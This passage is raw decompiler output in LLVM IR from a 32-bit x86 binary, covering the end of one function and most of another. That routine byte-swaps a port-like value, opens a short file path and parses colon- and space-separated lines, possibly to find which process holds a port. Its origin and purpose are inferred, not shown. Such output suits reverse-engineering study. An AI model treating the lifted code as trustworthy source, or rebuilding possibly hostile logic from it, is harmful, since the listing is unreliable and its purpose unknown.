  %v0_804d59e = phi i32 [ %v2_804d595, %dec_label_pc_804d59e.loopexit ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v1_804d59e = urem i32 %v0_804d59e, 65536
  %v1_804d5a2 = xor i32 %v1_804d59e, 65535
  ret i32 %v1_804d5a2

dec_label_pc_804d5ac:                             ; preds = %dec_label_pc_804d545
  %v1_804d5ae = inttoptr i32 %v0_804d5ae to i8*
  %v2_804d5ae = load i8, i8* %v1_804d5ae, align 1
  %v3_804d5ae = zext i8 %v2_804d5ae to i32
  %v2_804d5b0 = add i32 %v3_804d5ae, %v0_804d5b0
  br label %dec_label_pc_804d548

; uselistorder directives
  uselistorder i32 %v2_804d595, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804d586, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804d540, { 1, 0 }
  uselistorder i32 %v1_804d533, { 0, 2, 1 }
  uselistorder i32 %v3_804d521, { 1, 0 }
  uselistorder i32 %v4_804d515, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d590, { 1, 0 }
  uselistorder label %dec_label_pc_804d548, { 1, 0 }
  uselistorder label %dec_label_pc_804d530, { 1, 0 }
}

define i32 @function_804d5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d5e0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d5e0 = load i32, i32* @ebp, align 4
  %v0_804d5e1 = load i32, i32* @edi, align 4
  %v0_804d5e2 = load i32, i32* @esi, align 4
  %v0_804d5e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5e3, i32* %stack_var_-16, align 4
  %v15_804d5e4 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804d5ea = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804d5ea, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804d62d = call i32 @function_80527ca(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804d635 = trunc i32 %arg1 to i16
  %v2_804d635 = call i16 @llvm.bswap.i16(i16 %v1_804d635)
  %v3_804d635 = zext i16 %v2_804d635 to i32
  %v2_804d640 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804d640, i32* %eax.global-to-local, align 4
  store i32 %v3_804d635, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804d64b = call i32 @function_80527ca(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804d64b, i32* %eax.global-to-local, align 4
  %v2_804d65a = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804d65a, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804d662 = call i32 @function_80527ca(i8* %tmp72, i32 0, i32 4096)
  %v2_804d66a = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804d66a, i32* %eax.global-to-local, align 4
  %v0_804d674 = load i32, i32* @ebx, align 4
  %v5_804d674 = inttoptr i32 %v0_804d674 to i8*
  store i8* %v5_804d674, i8** %stack_var_-8796, align 4
  %v4_804d675 = sext i32 %v0_804d674 to i64
  %v5_804d675 = call i32 @function_80520b0(i64 %v4_804d675, i32 16, i32 %v2_804d66a)
  store i32 %v5_804d675, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804d683 = call i32 @function_8051ca0(i8* nonnull %stack_var_-48)
  store i32 %v3_804d683, i32* %eax.global-to-local, align 4
  %v9_804d68b = icmp eq i32 %v3_804d683, 2
  br i1 %v9_804d68b, label %dec_label_pc_804dbb5, label %dec_label_pc_804d694

dec_label_pc_804d694:                             ; preds = %dec_label_pc_804d5e0, %dec_label_pc_804dbb5
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d69b = call i32 @function_8051350(i8 6)
  store i32 %v3_804d69b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6a7 = call i32 @function_8051350(i8 7)
  store i32 %v3_804d6a7, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6b3 = call i32 @function_8051350(i8 9)
  %v2_804d6b8 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d6b8 = ptrtoint i8* %v2_804d6b8 to i32
  store i32 %v3_804d6b8, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054b90.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804d6c1 = call i32 @function_8052352(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054b90.20, i32 0, i32 0), i32 0)
  store i32 %v4_804d6c1, i32* @eax, align 4
  store i32 %v4_804d6c1, i32* @ebp, align 4
  %v10_804d6cb = icmp eq i32 %v4_804d6c1, -1
  br i1 %v10_804d6cb, label %dec_label_pc_804db4e, label %dec_label_pc_804d6d4.outer.preheader

dec_label_pc_804d6d4.outer.preheader:             ; preds = %dec_label_pc_804d694
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc9095 = call i32 @function_8051ec0(i32 %v2_804d5ea, i32 512, i32 %v4_804d6c1)
  store i32 %v4_804d6dc9095, i32* %eax.global-to-local, align 4
  %v1_804d6e49196 = icmp eq i32 %v4_804d6dc9095, 0
  br i1 %v1_804d6e49196, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph.lr.ph

dec_label_pc_804d6ec.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804d6d4.outer.preheader
  %v2_804d718 = add i32 %v15_804d5e4, 8221
  %v2_804d744 = add i32 %v15_804d5e4, 8219
  br label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec:                             ; preds = %dec_label_pc_804d6ec.lr.ph, %dec_label_pc_804d6d4.backedge
  %v4_804d6dc92 = phi i32 [ %v4_804d6dc9098, %dec_label_pc_804d6ec.lr.ph ], [ %v4_804d6dc, %dec_label_pc_804d6d4.backedge ]
  %v3_804d6ec = load i8, i8* %stack_var_-561, align 1
  %v4_804d6ec = sext i8 %v3_804d6ec to i32
  %v7_804d6ec = and i32 %v4_804d6dc92, -256
  %v8_804d6ec = or i32 %v4_804d6ec, %v7_804d6ec
  store i32 %v8_804d6ec, i32* @eax, align 4
  %v4_804d6f3 = icmp eq i8 %v3_804d6ec, 0
  br i1 %v4_804d6f3, label %dec_label_pc_804db17, label %dec_label_pc_804d6fb

dec_label_pc_804d6fb:                             ; preds = %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804d6fd = icmp eq i8 %v3_804d6ec, 58
  br i1 %v10_804d6fd, label %dec_label_pc_804db17, label %dec_label_pc_804d705.preheader

dec_label_pc_804d705.preheader:                   ; preds = %dec_label_pc_804d6fb
  %v1_804d706.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d705

dec_label_pc_804d705:                             ; preds = %dec_label_pc_804d705.preheader, %dec_label_pc_804d70d
  %v6_804d706 = phi i32 [ %v8_804d6ec, %dec_label_pc_804d705.preheader ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v0_804d705 = phi i32 [ 0, %dec_label_pc_804d705.preheader ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v1_804d705 = add i32 %v0_804d705, 1
  store i32 %v1_804d705, i32* %edx.global-to-local, align 4
  %v2_804d706 = add i32 %v1_804d705, %v1_804d706.pre
  %v3_804d706 = inttoptr i32 %v2_804d706 to i8*
  %v4_804d706 = load i8, i8* %v3_804d706, align 1
  %v5_804d706 = zext i8 %v4_804d706 to i32
  %v7_804d706 = and i32 %v6_804d706, -256
  %v8_804d706 = or i32 %v5_804d706, %v7_804d706
  store i32 %v8_804d706, i32* @eax, align 4
  %v4_804d709 = icmp eq i8 %v4_804d706, 0
  br i1 %v4_804d709, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d705
  %v10_804d70d = icmp eq i8 %v4_804d706, 58
  %v1_804d70f = icmp eq i1 %v10_804d70d, false
  br i1 %v1_804d70f, label %dec_label_pc_804d705, label %dec_label_pc_804d711

dec_label_pc_804d711:                             ; preds = %dec_label_pc_804d70d, %dec_label_pc_804db17
  %v1_804d72f = phi i32 [ 0, %dec_label_pc_804db17 ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v7_804d718 = phi i32 [ %v8_804d6ec, %dec_label_pc_804db17 ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v3_804d711 = trunc i32 %v7_804d718 to i8
  %v4_804d711 = icmp eq i8 %v3_804d711, 0
  br i1 %v4_804d711, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d715

dec_label_pc_804d6d4.backedge:                    ; preds = %dec_label_pc_804d705, %dec_label_pc_804d711, %dec_label_pc_804d744
  %v0_804d6d4.be = phi i32 [ %v7_804d718, %dec_label_pc_804d711 ], [ 0, %dec_label_pc_804d744 ], [ %v8_804d706, %dec_label_pc_804d705 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc = call i32 @function_8051ec0(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d4.be)
  store i32 %v4_804d6dc, i32* %eax.global-to-local, align 4
  %v1_804d6e4 = icmp eq i32 %v4_804d6dc, 0
  br i1 %v1_804d6e4, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec

dec_label_pc_804d715:                             ; preds = %dec_label_pc_804d711
  %v1_804d715 = add i32 %v1_804d72f, 2
  store i32 %v1_804d715, i32* @ecx, align 4
  %v3_804d718 = add i32 %v2_804d718, %v1_804d72f
  %v4_804d718 = inttoptr i32 %v3_804d718 to i8*
  %v5_804d718 = load i8, i8* %v4_804d718, align 1
  %v6_804d718 = zext i8 %v5_804d718 to i32
  %v8_804d718 = and i32 %v7_804d718, -256
  %v9_804d718 = or i32 %v6_804d718, %v8_804d718
  store i32 %v9_804d718, i32* %eax.global-to-local, align 4
  %v4_804d71f = icmp eq i8 %v5_804d718, 0
  br i1 %v4_804d71f, label %dec_label_pc_804d744, label %dec_label_pc_804d727

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d715
  %v7_804d727 = icmp eq i8 %v5_804d718, 32
  br i1 %v7_804d727, label %dec_label_pc_804d744, label %dec_label_pc_804d72f

dec_label_pc_804d72f:                             ; preds = %dec_label_pc_804d727
  %v0_804d72f = load i32, i32* @edi, align 4
  %v2_804d72f = add i32 %v0_804d72f, %v1_804d72f
  store i32 %v2_804d72f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d732

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d72f
  %v5_804d732 = phi i32 [ %v7_804d732, %dec_label_pc_804d73a ], [ %v1_804d72f, %dec_label_pc_804d72f ]
  %v0_804d735 = phi i32 [ %v1_804d735, %dec_label_pc_804d73a ], [ %v2_804d72f, %dec_label_pc_804d72f ]
  %v1_804d732 = add i32 %v0_804d735, 3
  %v2_804d732 = inttoptr i32 %v1_804d732 to i8*
  %v3_804d732 = load i8, i8* %v2_804d732, align 1
  %v4_804d732 = zext i8 %v3_804d732 to i32
  %v6_804d732 = and i32 %v5_804d732, -256
  %v7_804d732 = or i32 %v4_804d732, %v6_804d732
  store i32 %v7_804d732, i32* %edx.global-to-local, align 4
  %v1_804d735 = add i32 %v0_804d735, 1
  store i32 %v1_804d735, i32* %eax.global-to-local, align 4
  %v4_804d736 = icmp eq i8 %v3_804d732, 0
  br i1 %v4_804d736, label %dec_label_pc_804d73f, label %dec_label_pc_804d73a

dec_label_pc_804d73a:                             ; preds = %dec_label_pc_804d732
  %v7_804d73a = icmp eq i8 %v3_804d732, 32
  %v1_804d73d = icmp eq i1 %v7_804d73a, false
  br i1 %v1_804d73d, label %dec_label_pc_804d732, label %dec_label_pc_804d73f

dec_label_pc_804d73f:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d732
  %v2_804d73f = sub i32 %v1_804d735, %v0_804d72f
  store i32 %v2_804d73f, i32* %eax.global-to-local, align 4
  %v1_804d741 = add i32 %v2_804d73f, 2
  br label %dec_label_pc_804d744

dec_label_pc_804d744:                             ; preds = %dec_label_pc_804d715, %dec_label_pc_804d727, %dec_label_pc_804d73f
  %storemerge = phi i32 [ %v1_804d741, %dec_label_pc_804d73f ], [ %v1_804d715, %dec_label_pc_804d727 ], [ %v1_804d715, %dec_label_pc_804d715 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804d744 = add i32 %v2_804d744, %storemerge
  %v4_804d744 = inttoptr i32 %v3_804d744 to i8*
  store i8 0, i8* %v4_804d744, align 1
  %v0_804d74f = load i32, i32* @edi, align 4
  %v1_804d74f = load i32, i32* @ecx, align 4
  %v2_804d74f = add i32 %v1_804d74f, %v0_804d74f
  store i32 %v2_804d74f, i32* @ebx, align 4
  %v5_804d752 = inttoptr i32 %v2_804d74f to i8*
  store i8* %v5_804d752, i8** %stack_var_-8796, align 4
  %v3_804d753 = call i32 @function_8051ca0(i8* %v5_804d752)
  store i32 %v3_804d753, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* @edx, align 4
  %v0_804d764 = load i32, i32* @ebx, align 4
  %v5_804d764 = inttoptr i32 %v0_804d764 to i8*
  store i8* %v5_804d764, i8** %stack_var_-8796, align 4
  %v5_804d765 = call i32 @function_8051f90(i8* %v5_804d764, i32 %v3_804d753, i32 %v2_804d66a)
  %v1_804d76d = add i32 %v5_804d765, 1
  %v8_804d76d = icmp eq i32 %v1_804d76d, 0
  store i32 %v1_804d76d, i32* @eax, align 4
  br i1 %v8_804d76d, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d774

dec_label_pc_804d774:                             ; preds = %dec_label_pc_804d744
  %v0_804d774 = load i32, i32* @esi, align 4
  %v1_804d774 = add i32 %v0_804d774, 1
  %v0_804d777 = load i32, i32* @edi, align 4
  %v2_804d777 = add i32 %v0_804d777, %v0_804d774
  store i32 %v2_804d777, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804d783.outer:                       ; preds = %dec_label_pc_804db02, %dec_label_pc_804d774
  %v0_804daf830 = phi i32 [ %v1_804daf8, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  %v0_804d78625 = phi i32 [ %v1_804d786, %dec_label_pc_804db02 ], [ %v1_804d774, %dec_label_pc_804d774 ]
  %v5_804d78324 = phi i32 [ %v7_804d783, %dec_label_pc_804db02 ], [ %v1_804d76d, %dec_label_pc_804d774 ]
  %v0_804d78322 = phi i32 [ %v1_804db08, %dec_label_pc_804db02 ], [ %v2_804d777, %dec_label_pc_804d774 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  br label %dec_label_pc_804d783

dec_label_pc_804d783:                             ; preds = %dec_label_pc_804d783.outer, %dec_label_pc_804d7a5
  %v0_804daf8 = phi i32 [ %v0_804daf830, %dec_label_pc_804d783.outer ], [ %v0_804d7a6, %dec_label_pc_804d7a5 ]
  %v0_804db10 = phi i32 [ 0, %dec_label_pc_804d783.outer ], [ %storemerge4, %dec_label_pc_804d7a5 ]
  %v0_804d786 = phi i32 [ %v0_804d78625, %dec_label_pc_804d783.outer ], [ %v1_804d786, %dec_label_pc_804d7a5 ]
  %v5_804d783 = phi i32 [ %v5_804d78324, %dec_label_pc_804d783.outer ], [ %v7_804d783, %dec_label_pc_804d7a5 ]
  %v0_804d7a5 = phi i32 [ %v0_804d78322, %dec_label_pc_804d783.outer ], [ %v1_804d7a5, %dec_label_pc_804d7a5 ]
  %v1_804d783 = add i32 %v0_804d7a5, 2
  %v2_804d783 = inttoptr i32 %v1_804d783 to i8*
  %v3_804d783 = load i8, i8* %v2_804d783, align 1
  %v4_804d783 = zext i8 %v3_804d783 to i32
  %v6_804d783 = and i32 %v5_804d783, -256
  %v7_804d783 = or i32 %v4_804d783, %v6_804d783
  store i32 %v7_804d783, i32* @eax, align 4
  %v1_804d786 = add i32 %v0_804d786, 1
  %v4_804d787 = icmp eq i8 %v3_804d783, 0
  br i1 %v4_804d787, label %dec_label_pc_804d7ab, label %dec_label_pc_804d78b

dec_label_pc_804d78b:                             ; preds = %dec_label_pc_804d783
  %v7_804d78b = icmp eq i8 %v3_804d783, 32
  br i1 %v7_804d78b, label %dec_label_pc_804db10, label %dec_label_pc_804d793

dec_label_pc_804d793:                             ; preds = %dec_label_pc_804d78b
  %v10_804d793 = icmp eq i8 %v3_804d783, 9
  br i1 %v10_804d793, label %dec_label_pc_804db10, label %dec_label_pc_804d79b

dec_label_pc_804d79b:                             ; preds = %dec_label_pc_804d793
  %v1_804d79b = trunc i32 %v0_804db10 to i8
  %v9_804d79b = icmp eq i8 %v1_804d79b, 1
  br i1 %v9_804d79b, label %dec_label_pc_804daf8, label %dec_label_pc_804d7a3

dec_label_pc_804d7a3:                             ; preds = %dec_label_pc_804daf8, %dec_label_pc_804d79b
  %v0_804d7a631 = phi i32 [ %v1_804daf8, %dec_label_pc_804daf8 ], [ %v0_804daf8, %dec_label_pc_804d79b ]
  br label %dec_label_pc_804d7a5

dec_label_pc_804d7a5:                             ; preds = %dec_label_pc_804db10, %dec_label_pc_804d7a3
  %v0_804d7a6 = phi i32 [ %v0_804d7a631, %dec_label_pc_804d7a3 ], [ %v0_804daf8, %dec_label_pc_804db10 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804d7a3 ], [ %v2_804db10, %dec_label_pc_804db10 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804d7a5 = add i32 %v0_804d7a5, 1
  store i32 %v1_804d7a5, i32* %edx.global-to-local, align 4
  %v7_804d7a9 = icmp sgt i32 %v0_804d7a6, 6
  br i1 %v7_804d7a9, label %dec_label_pc_804d7ab, label %dec_label_pc_804d783

dec_label_pc_804d7ab:                             ; preds = %dec_label_pc_804d7a5, %dec_label_pc_804d783
  %v5_804d7ca35 = phi i32 [ %storemerge4, %dec_label_pc_804d7a5 ], [ %v0_804db10, %dec_label_pc_804d783 ]
  store i32 %v1_804d786, i32* %edx.global-to-local, align 4
  %v4_804d7ad = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804d7ad, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7b8

dec_label_pc_804d6d4.outer.backedge:              ; preds = %dec_label_pc_804d7ab, %dec_label_pc_804d7d8
  %v0_804d6d48.be = phi i32 [ %v3_804d7e7, %dec_label_pc_804d7d8 ], [ %v7_804d783, %dec_label_pc_804d7ab ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804d7d8 ], [ 0, %dec_label_pc_804d7ab ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc90 = call i32 @function_8051ec0(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d48.be)
  store i32 %v4_804d6dc90, i32* %eax.global-to-local, align 4
  %v1_804d6e491 = icmp eq i32 %v4_804d6dc90, 0
  br i1 %v1_804d6e491, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec.lr.ph:                       ; preds = %dec_label_pc_804d6ec.lr.ph.lr.ph, %dec_label_pc_804d6d4.outer.backedge
  %v4_804d6dc9098 = phi i32 [ %v4_804d6dc9095, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %v4_804d6dc90, %dec_label_pc_804d6d4.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ]
  br label %dec_label_pc_804d6ec

dec_label_pc_804d7b8:                             ; preds = %dec_label_pc_804d7ab
  %v3_804d7b8 = add i32 %v1_804d786, %v2_804d744
  %v4_804d7b8 = inttoptr i32 %v3_804d7b8 to i8*
  %v5_804d7b8 = load i8, i8* %v4_804d7b8, align 1
  %v6_804d7b8 = zext i8 %v5_804d7b8 to i32
  %v9_804d7b8 = or i32 %v6_804d7b8, %v6_804d783
  store i32 %v9_804d7b8, i32* %eax.global-to-local, align 4
  %v4_804d7bf = icmp eq i8 %v5_804d7b8, 0
  br i1 %v4_804d7bf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c3

dec_label_pc_804d7c3:                             ; preds = %dec_label_pc_804d7b8
  %v7_804d7c3 = icmp eq i8 %v5_804d7b8, 32
  br i1 %v7_804d7c3, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c7

dec_label_pc_804d7c7:                             ; preds = %dec_label_pc_804d7c3
  %v2_804d7c7 = add i32 %v1_804d786, %v0_804d777
  store i32 %v2_804d7c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7ca

dec_label_pc_804d7ca:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7c7
  %v0_804d7cd = phi i32 [ %v1_804d7cd, %dec_label_pc_804d7d3 ], [ %v1_804d786, %dec_label_pc_804d7c7 ]
  %v5_804d7ca = phi i32 [ %v7_804d7ca, %dec_label_pc_804d7d3 ], [ %v5_804d7ca35, %dec_label_pc_804d7c7 ]
  %v0_804d7ce = phi i32 [ %v1_804d7ca, %dec_label_pc_804d7d3 ], [ %v2_804d7c7, %dec_label_pc_804d7c7 ]
  %v1_804d7ca = add i32 %v0_804d7ce, 1
  %v2_804d7ca = inttoptr i32 %v1_804d7ca to i8*
  %v3_804d7ca = load i8, i8* %v2_804d7ca, align 1
  %v1_804d7cd = add i32 %v0_804d7cd, 1
  store i32 %v1_804d7ca, i32* %eax.global-to-local, align 4
  %v4_804d7cf = icmp eq i8 %v3_804d7ca, 0
  br i1 %v4_804d7cf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7d3

dec_label_pc_804d7d3:                             ; preds = %dec_label_pc_804d7ca
  %v4_804d7ca = zext i8 %v3_804d7ca to i32
  %v6_804d7ca = and i32 %v5_804d7ca, -256
  %v7_804d7ca = or i32 %v4_804d7ca, %v6_804d7ca
  %v7_804d7d3 = icmp eq i8 %v3_804d7ca, 32
  %v1_804d7d6 = icmp eq i1 %v7_804d7d3, false
  br i1 %v1_804d7d6, label %dec_label_pc_804d7ca, label %dec_label_pc_804d7d8

dec_label_pc_804d7d8:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7ca, %dec_label_pc_804d7c3, %dec_label_pc_804d7b8
  %v1_804d7d8 = phi i32 [ %v1_804d786, %dec_label_pc_804d7c3 ], [ %v1_804d786, %dec_label_pc_804d7b8 ], [ %v1_804d7cd, %dec_label_pc_804d7ca ], [ %v1_804d7cd, %dec_label_pc_804d7d3 ]
  %v3_804d7d8 = add i32 %v1_804d7d8, %v2_804d744
  %v4_804d7d8 = inttoptr i32 %v3_804d7d8 to i8*
  store i8 0, i8* %v4_804d7d8, align 1
  %v0_804d7e3 = load i32, i32* @edi, align 4
  %v1_804d7e3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7e3 = add i32 %v1_804d7e3, %v0_804d7e3
  store i32 %v2_804d7e3, i32* @ebx, align 4
  %v5_804d7e6 = inttoptr i32 %v2_804d7e3 to i8*
  store i8* %v5_804d7e6, i8** %stack_var_-8796, align 4
  %v3_804d7e7 = call i32 @function_8051ca0(i8* %v5_804d7e6)
  store i32 %v3_804d7e7, i32* @eax, align 4
  %v1_804d7ef = add i32 %v3_804d7e7, -15
  %v6_804d7ef = sub i32 14, %v3_804d7e7
  %v7_804d7ef = and i32 %v6_804d7ef, %v3_804d7e7
  %v8_804d7ef = icmp slt i32 %v7_804d7ef, 0
  %v9_804d7ef = icmp eq i32 %v1_804d7ef, 0
  %v10_804d7ef = icmp slt i32 %v1_804d7ef, 0
  %v3_804d7f2 = icmp eq i1 %v10_804d7ef, %v8_804d7ef
  %v4_804d7f2 = icmp eq i1 %v9_804d7ef, false
  %v5_804d7f2 = and i1 %v4_804d7f2, %v3_804d7f2
  br i1 %v5_804d7f2, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7f8

dec_label_pc_804d7f8:                             ; preds = %dec_label_pc_804d7d8
  %v0_804d7fa = load i32, i32* @ebx, align 4
  %v2_804d7fb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d7fb, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804d803 = call i32 @function_8051cc0(i8* %tmp73, i32 %v0_804d7fa)
  store i32 %v4_804d803, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b.loopexit:                    ; preds = %dec_label_pc_804d6d4.backedge, %dec_label_pc_804d6d4.outer.preheader, %dec_label_pc_804d6d4.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804d6d4.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804d6d4.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b:                             ; preds = %dec_label_pc_804d80b.loopexit, %dec_label_pc_804d7f8
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804d80b.loopexit ], [ %tmp73, %dec_label_pc_804d7f8 ]
  %v2_804d815.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d80b.loopexit ], [ %v2_804d7fb, %dec_label_pc_804d7f8 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804d80b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804d7f8 ]
  %v0_804d80e = load i32, i32* @ebp, align 4
  %v5_804d80e = inttoptr i32 %v0_804d80e to i8*
  store i8* %v5_804d80e, i8** %stack_var_-8796, align 4
  %v2_804d80f = call i32 @function_8052241(i32 %v0_804d80e)
  %v2_804d814 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d814 = ptrtoint i8* %v2_804d814 to i32
  store i32 %v3_804d814, i32* %eax.global-to-local, align 4
  store i32 %v2_804d815.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804d81d = call i32 @function_8051ca0(i8* %.pre-phi)
  store i32 %v3_804d81d, i32* %eax.global-to-local, align 4
  %v1_804d825 = icmp eq i32 %v3_804d81d, 0
  br i1 %v1_804d825, label %dec_label_pc_804db27, label %dec_label_pc_804d82d

dec_label_pc_804d82d:                             ; preds = %dec_label_pc_804d80b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804d833 = call i32 @function_80512a0(i32 6, i32* null)
  store i32 %v4_804d833, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804d83a = inttoptr i32 %v4_804d833 to i8*
  store i8* %v4_804d83a, i8** %stack_var_-8796, align 4
  %v2_804d83d = call i32 @function_8052604(i32 %v4_804d833)
  store i32 %v2_804d83d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d83d, i32* %stack_var_-8780, align 4
  %v1_804d849 = icmp eq i32 %v2_804d83d, 0
  br i1 %v1_804d849, label %dec_label_pc_804db77, label %dec_label_pc_804d859

dec_label_pc_804d859:                             ; preds = %dec_label_pc_804d918, %dec_label_pc_804d88a, %dec_label_pc_804d87d, %dec_label_pc_804dbee, %dec_label_pc_804d82d
  %v0_804d859 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804dbf7, %dec_label_pc_804dbee ], [ %v1_804d866, %dec_label_pc_804d87d ], [ %v1_804d90e, %dec_label_pc_804d88a ], [ %v1_804d990, %dec_label_pc_804d918 ]
  %v2_804d85c = inttoptr i32 %v0_804d859 to i32*
  %v3_804d85c = load i32, i32* %v2_804d85c, align 4
  store i32 %v3_804d85c, i32* @ebx, align 4
  %v2_804d860 = add i32 %v0_804d859, -16
  %v3_804d860 = inttoptr i32 %v2_804d860 to i32*
  store i32 %v3_804d85c, i32* %v3_804d860, align 4
  %v0_804d861 = call i32 @function_80526f5()
  store i32 %v0_804d861, i32* @eax, align 4
  %v0_804d866 = load i32, i32* @esp, align 4
  %v1_804d866 = add i32 %v0_804d866, 16
  %v1_804d869 = icmp eq i32 %v0_804d861, 0
  br i1 %v1_804d869, label %dec_label_pc_804db62, label %dec_label_pc_804d871

